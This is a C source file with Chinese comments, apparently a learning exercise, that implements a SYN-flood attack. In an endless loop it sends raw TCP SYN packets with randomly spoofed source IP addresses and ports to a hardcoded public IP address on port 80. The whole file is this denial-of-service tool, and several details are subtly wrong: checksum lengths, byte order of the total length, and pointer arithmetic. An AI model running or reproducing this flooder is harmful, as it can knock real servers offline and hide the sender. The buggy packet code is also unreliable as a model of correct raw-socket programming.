#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <time.h>
#include <unistd.h>

#define DEST_IP "49.234.233.219"
#define DEST_PORT 80
#define PACKET_LEN 1000

// 我从网上找了一份计算校验和代码
// TCP:首部和数据校验和，整体长度；IP:首部校验和，首部长度：ihl；
unsigned short in_cksum(unsigned short *addr, int len)
{
    unsigned int sum = 0, nleft = len;
    unsigned short answer = 0;
    unsigned short *w = addr;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(__u_char *) (&answer) = *(__u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);//将高16bit与低16bit相加

    sum += (sum >> 16);//将进位到高位的16bit与低16bit 再相加
    answer = (unsigned short)(~sum);
    return (answer);
}


void send_raw_ip_packet(struct iphdr *ippacket){

    // 创建一个原生套接字
    // IPPROTO_RAW表明我们将支持ip头部，系统不需要提供IP头部
    // IPPROTO_RAW同时表明允许IP_HDRINCL
    int sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

    // int enable = 1;
    // setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&enable,sizeof(enable));

    // 提供目的地选项
    // sockaddr_in提供的结构体，用来构建IP头；现在IP头已经有了，应当不用提供这样的结构体
    // 书上说：提供目的地址，帮助内核获得目的IP对应的MAC地址
    struct sockaddr_in dest_info;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr.s_addr = ippacket->daddr;

    // struct tcphdr *tcpheader = (struct tcphdr *)(ippacket + sizeof(struct iphdr));
    struct tcphdr *tcpheader = (struct tcphdr *)(ippacket + ippacket->ihl*4);
    printf("des:port -- %s:%uh\n",inet_ntoa(dest_info.sin_addr),ntohs(tcpheader->dest));
    // 发送包
    sendto(sock,ippacket,ntohs(ippacket->tot_len),0,(struct sockaddr *)(&dest_info),sizeof(dest_info));
    
    close(sock);
}


int main(void){
    // IPv4,数据包长度不超多65535
    // 超过MTU=1500，要分片
    // 凑个整，这里定义PACKET_LEN=1000
    char buffer[PACKET_LEN];
    struct iphdr *ipheader = (struct iphdr *)(buffer);
    struct tcphdr *tcpheader = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    // struct tcphdr *tcpheader = (struct tcphdr *)(ippacket + ippacket->ihl*4);

    // 初始化随机数发生器
    srand(time(0));

    while (1){
        bzero(buffer,sizeof(buffer));

        // 填充TCP头部
        tcpheader->source = rand();
        tcpheader->dest = htons(DEST_PORT);
        tcpheader->seq = 0;
        tcpheader->ack_seq = 0;
        tcpheader->doff = 5;
        tcpheader->fin=0;
        tcpheader->syn=1;
        tcpheader->rst=0;
        tcpheader->psh=0;
        tcpheader->ack=0;
        tcpheader->urg=0;
        tcpheader->window = htons(666);
        tcpheader->check = in_cksum((unsigned short *)tcpheader,sizeof(tcpheader));
        tcpheader->urg_ptr = 0;

        // 填充IP头部
        ipheader->ihl = 5;
        ipheader->version = 4;
        ipheader->tos = 0;
        ipheader->tot_len = PACKET_LEN;
        ipheader->id = htons(PACKET_LEN);
        ipheader->frag_off = 0;
        ipheader->ttl = 255;
        ipheader->protocol = IPPROTO_TCP;
        ipheader->check = 0;
        ipheader->saddr = rand();
        ipheader->daddr = inet_addr(DEST_IP);
        ipheader->check = in_cksum((unsigned short *)ipheader,ipheader->ihl);

        // printf("ready to send!");
        // struct tcphdr *tcpheader = (struct tcphdr *)(buffer + sizeof(struct iphdr));
        // printf("port:%uh\n",ntohs(tcpheader->dest));

        send_raw_ip_packet((struct iphdr*)buffer);
    }
    
    return 0;
}